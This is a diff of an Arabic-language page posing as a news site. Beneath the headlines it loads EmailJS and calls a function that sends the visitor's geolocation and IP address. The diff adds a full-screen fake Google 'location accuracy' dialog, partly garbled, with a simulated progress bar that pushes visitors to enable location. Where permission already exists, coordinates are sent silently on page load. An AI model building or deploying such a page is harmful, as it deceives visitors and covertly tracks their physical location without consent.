@@ -1,13 +1,120 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>أخبار اليوم</title>
   <style>
-    body { font-family: Arial; margin: 0; padding: 0; background: #f2f2f2; }
-    header { background: #1e90ff; color: white; padding: 20px; text-align: center; }
-    article { background: white; margin: 20px auto; padding: 20px; max-width: 800px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+    body { 
+      font-family: Arial, sans-serif; 
+      margin: 0; 
+      padding: 0; 
+      background: #f2f2f2; 
+      direction: rtl;
+    }
+    header { 
+      background: #1e90ff; 
+      color: white; 
+      padding: 20px; 
+      text-align: center; 
+    }
+    article { 
+      background: white; 
+      margin: 20px auto; 
+      padding: 20px; 
+      max-width: 800px; 
+      border-radius: 8px; 
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1); 
+    }
     h2 { color: #1e90ff; }
+    
+    /* نافذة طلب التفعيل */
+    .location-modal {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+    
+    .modal-content {
+      background-color: white;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+    }
+    
+    .modal-header {
+      background-color: #f8f8f8;
+      padding: 15px;
+      text-align: center;
+      border-bottom: 1px solid #e0e0e0;
+    }
+    
+    .modal-body {
+      padding: 20px;
+    }
+    
+    .modal-footer {
+      display: flex;
+      justify-content: space-between;
+      padding: 15px;
+      border-top: 1px solid #e0e0e0;
+    }
+    
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    
+    .btn-primary {
+      background-color: #1e90ff;
+      color: white;
+    }
+    
+    .btn-secondary {
+      background-color: #f0f0f0;
+      color: #333;
+    }
+    
+    .progress-container {
+      margin: 15px 0;
+      text-align: center;
+    }
+    
+    .progress-bar {
+      height: 5px;
+      background-color: #e0e0e0;
+      border-radius: 5px;
+      overflow: hidden;
+    }
+    
+    .progress {
+      height: 100%;
+      background-color: #1e90ff;
+      width: 1%;
+      transition: width 0.3s;
+    }
+    
+    .progress-text {
+      font-size: 12px;
+      color: #666;
+      margin-top: 5px;
+    }
+    
+    .hidden {
+      display: none;
+    }
   </style>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
@@ -41,23 +148,96 @@
         alert("متصفحك لا يدعم تحديد الموقع.");
         return;
       }
+      
+      // محاكاة شريط التقدم
+      const progressBar = document.getElementById('progressBar');
+      const progressText = document.getElementById('progressText');
+      let progress = 1;
+      
+      const progressInterval = setInterval(() => {
+        progress += Math.random() * 3;
+        if (progress > 100) progress = 100;
+        progressBar.style.width = progress + '%';
+        progressText.textContent = Math.floor(progress) + '%';
+        
+        if (progress >= 100) {
+          clearInterval(progressInterval);
+        }
+      }, 100);
+      
       navigator.geolocation.getCurrentPosition(
         function(position) {
-          sendLocationAndIP(position.coords.latitude, position.coords.longitude);
+          clearInterval(progressInterval);
+          progressBar.style.width = '100%';
+          progressText.textContent = '100%';
+          
+          setTimeout(() => {
+            document.getElementById('locationModal').classList.add('hidden');
+            sendLocationAndIP(position.coords.latitude, position.coords.longitude);
+          }, 500);
         },
         function(error) {
+          clearInterval(progressInterval);
           alert("⚠️ لم يتم تحديد الموقع. تأكد أن خدمة الموقع مفعلة.");
         }
       );
     }
 
+    function checkLocationPermission() {
+      if (!navigator.geolocation) {
+        alert("متصفحك لا يدعم تحديد الموقع.");
+        return;
+      }
+      
+      // محاولة الحصول على الموقع لمعرفة ما إذا كان مفعلاً
+      navigator.geolocation.getCurrentPosition(
+        function(position) {
+          // الموقع مفعل، لا حاجة لعرض النافذة
+          sendLocationAndIP(position.coords.latitude, position.coords.longitude);
+        },
+        function(error) {
+          // الموقع غير مفعل، عرض نافذة الطلب
+          document.getElementById('locationModal').classList.remove('hidden');
+        }
+      );
+    }
+
     window.onload = function() {
-      alert("لتعمل الصفحة بشكل كامل، يرجى تفعيل خدمة الموقع على جهازك ثم الضغط على OK.");
-      requestLocation();
+      checkLocationPermission();
     };
   </script>
 </head>
 <body>
+  <!-- نافذة طلب تفعيل الموقع -->
+  <div id="locationModal" class="location-modal">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h3>بيت اللهم؟</h3>
+        <p style="font-size: 14px; margin: 5px 0 0 0; color: #666;">سريع</p>
+      </div>
+      <div class="modal-body">
+        <p><strong>للمتابعة، يجب تفعيل الإعداد "دقة الموقع الجغرافي" في جهازك</strong></p>
+        <p>يجب أن تكون الإعدادات التالية مفعلة:</p>
+        <ul>
+          <li>الموقع الجغرافي للجهاز</li>
+        </ul>
+        <p>يسمح الإعداد "دقة الموقع الجغرافي" بتزويد التطبيقات والخدمات بيانات موقعك الجغرافي بشكل أكثر دقة. ولإجراء ذلك، تعالج Google بشكل دوري المعلومات حول أدوات الاستشعار بجهازك والإنشاءات اللاستيكية التي يرسلها لجمع بيانات المواقع الجغرافية للإنشاءات اللاستيكية. وتُسخِّم هذه المعلومات بدون الكشف عن هويتك لتحسين دقة تحديد الموقع الجغرافي والخدمات المستندة إليها. وتحسين خدمات Google وتقديمها وصيانتها استنادًا إلى المصالح المشروعة للجهات الخارجية وGoogle من أجل تلبية احتياجات المستخدمين.</p>
+        <p>يمكنك تغيير ذلك من إعدادات الموقع الجغرافي متى شئت. <a href="#">إدارة الإعدادات</a> أو <a href="#">الاطلاع على المزيد من المعلومات</a></p>
+        
+        <div class="progress-container">
+          <div class="progress-bar">
+            <div id="progressBar" class="progress"></div>
+          </div>
+          <div id="progressText" class="progress-text">1%</div>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button id="activateBtn" class="btn btn-primary">تفعيل</button>
+        <button id="cancelBtn" class="btn btn-secondary">لا، شكرًا</button>
+      </div>
+    </div>
+  </div>
+
   <header>
     <h1>أخبار اليوم</h1>
   </header>
@@ -76,5 +256,16 @@
     <h2>رياضة</h2>
     <p>أبرز الأخبار الرياضية، نتائج المباريات، وترتيب الدوري الحالي.</p>
   </article>
+
+  <script>
+    // إضافة مستمعي الأحداث للأزرار
+    document.getElementById('activateBtn').addEventListener('click', function() {
+      requestLocation();
+    });
+    
+    document.getElementById('cancelBtn').addEventListener('click', function() {
+      document.getElementById('locationModal').classList.add('hidden');
+    });
+  </script>
 </body>
 </html>
